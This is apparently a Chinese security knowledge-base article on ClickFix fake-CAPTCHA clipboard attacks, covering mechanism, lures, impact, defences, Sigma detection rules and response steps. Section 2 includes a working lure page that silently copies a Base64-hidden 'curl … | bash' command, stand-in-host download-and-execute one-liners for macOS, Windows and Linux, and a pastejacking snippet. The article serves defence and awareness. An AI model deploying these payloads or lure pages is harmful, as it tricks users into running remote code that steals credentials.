# 假验证码剪贴板攻击 ClickFix (Fake CAPTCHA Clipboard Attack)

> 分类：社会工程学 / 用户执行 | 风险：高 | MITRE T1204.004 | 攻击链：投递 → 执行

## 1. 攻击原理

攻击者在网页上伪造「人机验证 / 我不是机器人」，诱导访客按提示**打开终端或运行框，粘贴并回车**。点击「验证」的瞬间，页面用 JavaScript 把一行 **Base64 编码的恶意命令**写入剪贴板（用户无感知）。用户一次 `Ctrl+V` + `Enter`，就把「下载并执行远程脚本」交给了自己的机器。

本质：**攻击者不攻破系统，而是让用户自己成为执行器**。技术门槛极低，但绕过效果极好——它绕开了浏览器沙箱、绕开了「不要下载未知 exe」的常规提醒，甚至专骗有一定技术背景的人。

常见别名：ClickFix、Fake CAPTCHA、Clipboard Hijack、Paste-and-Run、ClearFake（一类挂马框架）。

### 与相近攻击的区别

| 攻击 | 谁在执行 | 是否需要目标站漏洞 | 骗的是什么 |
|---|---|---|---|
| CSRF | 浏览器自动 | 可能需要 | 用户已登录状态 |
| XSS | 浏览器 | 是（输出未编码） | 同源上下文 |
| 钓鱼（41） | 用户 | 否 | 账号密码 / OTP |
| **ClickFix（本篇）** | **用户手动执行** | **否** | **让用户运行代码** |
| 恶意下载站 | 用户 | 否 | 点击「下载并运行」 |
| 水坑攻击 | 浏览器 | 是（站点被黑） | 访问即中招（无需交互） |

ClickFix 的特殊性：**交互成本极低、成功率高、可完全托管在静态页面上**，因此成为 2024 年后最流行的恶意软件投递手法之一。

## 2. 攻击示例

### 2.1 假 Cloudflare 验证页

```html
<div class="captcha">
  <h2>请验证您是真人</h2>
  <ol>
    <li>按 <kbd>⌘</kbd> + <kbd>Space</kbd> 打开终端</li>
    <li>按 <kbd>⌘</kbd> + <kbd>V</kbd> 粘贴</li>
    <li>按 <kbd>Enter</kbd> 执行验证</li>
  </ol>
  <button id="verify">我已完成验证</button>
</div>

<script>
  const PAYLOAD = 'echo "Y3VybCAtcyBodHRwczovL2V2aWwuZXhhbXBsZS9zLnNoIHwgYmFzaA==" | base64 -d | bash';

  document.getElementById('verify').addEventListener('click', async () => {
    // 点击即写入剪贴板，用户毫无感知
    await navigator.clipboard.writeText(PAYLOAD);
    document.body.innerHTML = '<p>验证中，请稍候…</p>';
  });
</script>
```

Base64 解码后：

```bash
curl -s https://evil.example/s.sh | bash
```

### 2.2 常见伪装话术

| 场景 | 话术 |
|---|---|
| 人机验证 | 「请完成验证以继续访问」 |
| 浏览器错误 | 「您的浏览器版本过旧，请按以下步骤修复」 |
| 系统更新 | 「检测到安全更新，请在终端执行以下命令」 |
| 会议邀请 | 「加入会议前需安装组件，请复制并运行」 |
| 版权投诉 | 「您的访问因版权问题被拦截，请验证」 |
| 验证码失效 | 「验证失败，请手动执行以下修复脚本」 |

### 2.3 macOS / Windows 载荷形态

```bash
# macOS：Base64 混淆 + 管道执行
echo "<base64>" | base64 -d | bash
osascript -e 'do shell script "curl -s http://evil/x | sh"'
```

```powershell
# Windows：隐藏窗口 + 远程执行
powershell -w hidden -c "iwr http://evil/a.ps1 | iex"
mshta http://evil/a.hta
```

```bash
# Linux
bash -c "$(curl -fsSL http://evil/x.sh)"
```

### 2.4 变种：Pastejacking

不弹假验证码，而是在用户**合法复制**内容时偷偷替换剪贴板：

```js
document.addEventListener('copy', (e) => {
  e.clipboardData.setData('text/plain', 'curl -s http://evil/x | bash');
  e.preventDefault();
});
```

用户以为复制了命令文档，粘进终端却执行了恶意代码。

### 2.5 变种：假「修复」引导 + 真实品牌页面

攻击者在被入侵的正规站点注入脚本，页面视觉与品牌完全一致（甚至 HTTPS 证书合法），只在验证环节插入终端指令——可信度极高。

## 3. 影响

一旦回车执行，等同**本机失守**：

- **凭据全量泄露**：浏览器保存的密码、Cookie（可直接接管已登录账号并绕过 MFA）、macOS Keychain、SSH 私钥、云 CLI 凭证、加密钱包
- **持久化后门**：LaunchAgent / LaunchDaemon / cron / 登录项 / Windows 计划任务，改密码后仍可回来
- **内网横向**：公司设备被控后作为跳板
- **勒索前置**：窃密木马通常是勒索团伙的第一阶段侦察
- **二次传播**：通讯录/邮箱被用于向同事客户发送同类攻击

对应知识库：Cookie 被窃 → `42-account-takeover`；凭据被用于登录 → `14-brute-force`；持久化与横向 → `40-logging-monitoring` 的检测缺口。

## 4. 防御措施

### 4.1 一条铁律

> **任何「人机验证」都不会要求你打开终端、运行命令、粘贴代码。**
> 真实验证只有：点图片、拖滑块、勾选框、等待几秒、输入图中字符。

出现「按 Win+R」「打开 Terminal」「粘贴这行」——100% 是攻击，直接关页面。

### 4.2 个人侧

1. 立即关闭页面；用一段无关文字覆盖剪贴板。
2. 浏览器限制剪贴板写入：Chrome「设置 → 隐私和安全 → 网站设置 → 剪贴板 → 不允许网站查看/编辑」。
3. 安装 uBlock Origin，减少恶意广告与挂马脚本入口。
4. 不从不熟悉的搜索结果下载「官方软件」；核对域名与官方渠道。
5. 保持 Gatekeeper / SmartScreen 开启，不关闭系统安全提示。
6. 终端里看到 `curl | bash`、`base64 -d | sh`、`iwr | iex` 先停下来看清来源。

### 4.3 企业侧

1. **EDR 检测规则**：监控「浏览器进程 → 终端/PowerShell」父子链；监控 `base64 -d | bash`、`curl|bash`、`iwr|iex`。
2. **浏览器策略**：限制不受信源写剪贴板；禁用自动粘贴；强制扩展白名单。
3. **网络层**：DNS/代理拦截新注册域名与低信誉域名；限制直连 IP 与非常规端口。
4. **执行控制**：禁止从 `/tmp`、`~/Downloads` 直接执行脚本；应用白名单。
5. **邮件/网关**：识别「CAPTCHA + 终端指令」话术模板，链接重写 + 沙箱。
6. **培训**：把 ClickFix 作为独立演练场景（它专骗「懂一点技术」的人）。
7. **响应预案**：断网 → 保全证据 → 吊销全部会话与 Token → 排查持久化 → 视情况重装。

### 4.4 已执行的应急顺序

```text
1. 断开网络（关 Wi-Fi / 拔网线）——止血，防外传与二次下载
2. 不关机（保留内存与进程证据），不再输入任何密码
3. 用另一台干净设备改密：邮箱主账号 → 银行/支付 → 社交 → 代码托管/云平台
4. 吊销所有会话与 Token：登出所有设备、撤销 API Key、撤销 OAuth 授权
5. 排查持久化与异常进程（见 5.3 命令）
6. 检查浏览器扩展、代理设置是否被篡改
7. 无法确认清理干净 → 备份数据后抹盘重装，再逐项恢复并改密
8. 公司设备立即上报安全团队，不要自行「清理」后继续使用
```

## 5. 代码与检测对比

### 5.1 真实验证 vs 假验证

```html
<!-- ❌ 假验证：要求用户操作终端 -->
<p>请打开终端，粘贴以下命令后回车：</p>
<button onclick="navigator.clipboard.writeText(PAYLOAD)">验证</button>

<!-- ✅ 真验证：嵌入式挑战，无任何终端操作 -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<div class="cf-turnstile" data-sitekey="YOUR_SITE_KEY"></div>
```

```js
// ✅ 服务端校验真实验证结果，而不是信任前端「已完成」标志
const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
  method: 'POST',
  body: new URLSearchParams({
    secret: process.env.TURNSTILE_SECRET,
    response: req.body['cf-turnstile-response'],
    remoteip: req.ip,
  }),
});
const { success } = await r.json();
if (!success) return res.status(403).json({ error: 'verification failed' });
```

### 5.2 浏览器侧限制

```
# ✅ 限制被嵌入页面写剪贴板（顶层页面仍可能写，故不能只靠它）
Permissions-Policy: clipboard-write=(self), clipboard-read=()
```

```js
// ✅ 关键操作不依赖剪贴板：不要设计「复制命令去终端执行」的流程
// 需要安装组件时，走系统安装包 + 签名校验，而不是 curl|bash
```

### 5.3 检测：EDR / Sigma 思路

```yaml
title: Suspicious Base64 Pipe To Shell
logsource:
  category: process_creation
  product: macos
detection:
  b64:
    CommandLine|contains:
      - 'base64 -d'
      - 'base64 --decode'
      - 'base64 -D'
  pipe:
    CommandLine|contains:
      - '| bash'
      - '| sh'
      - '| zsh'
  condition: b64 and pipe
level: high
```

```yaml
title: Browser Spawning Terminal (macOS)
logsource:
  category: process_creation
  product: macos
detection:
  parent:
    ParentImage|endswith:
      - '/Safari'
      - '/Google Chrome'
      - '/Firefox'
      - '/Microsoft Edge'
  child:
    Image|endswith:
      - '/Terminal'
      - '/iTerm2'
      - '/osascript'
  condition: parent and child
level: high
```

```bash
# 手工只读排查（macOS）
pbpaste                                   # 当前剪贴板
tail -n 50 ~/.zsh_history                 # 是否执行过 base64 / curl
ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons
crontab -l
lsof -i -P -n | grep ESTABLISHED          # 陌生外联
ps aux | grep -Ei 'curl|wget|base64|osascript' | grep -v grep
networksetup -getwebproxy Wi-Fi           # 代理是否被改
sudo find /tmp /var/tmp ~/Library -mtime -1 -type f 2>/dev/null | head -50
```

## 6. 自查清单

**作为网站建设者**
- [ ] 验证组件使用正规服务（Turnstile / reCAPTCHA / hCaptcha），且服务端二次校验
- [ ] 站点无「复制命令到终端执行」类交互设计
- [ ] CSP 限制第三方脚本，降低被挂马注入概率
- [ ] 依赖与建站插件及时更新，防被植入恶意 JS
- [ ] 监控页面被注入异常脚本（SRI / CSP 报告 / 定时巡检）

**作为企业防护方**
- [ ] EDR 覆盖 `base64 -d | sh` 与「浏览器拉终端」行为
- [ ] DNS/代理拦截新注册与低信誉域名
- [ ] 禁止从临时目录直接执行脚本
- [ ] 浏览器策略限制剪贴板写入与自动粘贴
- [ ] 钓鱼/ClickFix 演练已纳入培训
- [ ] 已执行事件的响应预案可落地（断网、吊销、重装）

**作为个人用户**
- [ ] 知道「真验证码绝不要求开终端」
- [ ] 浏览器已限制网站写剪贴板
- [ ] 看到 `curl|bash`、`base64 -d`、`iwr|iex` 会先停手核对
- [ ] 主要账号启用抗钓鱼 MFA（Passkey）

## 7. 参考资料

- MITRE ATT&CK T1204.004: Malicious Copy and Paste
- MITRE ATT&CK T1059.004: Command and Scripting Interpreter — Unix Shell
- MITRE ATT&CK T1140: Deobfuscate/Decode Files or Information
- Microsoft Security Blog: ClickFix / fake CAPTCHA 相关威胁分析
- Proofpoint / Sekoia: ClickFix 与 ClearFake 活动报告
- OWASP: Social Engineering / Phishing 相关指南
- 关联本库：`41-phishing`（社工入口）、`42-account-takeover`（窃密后的接管路径）
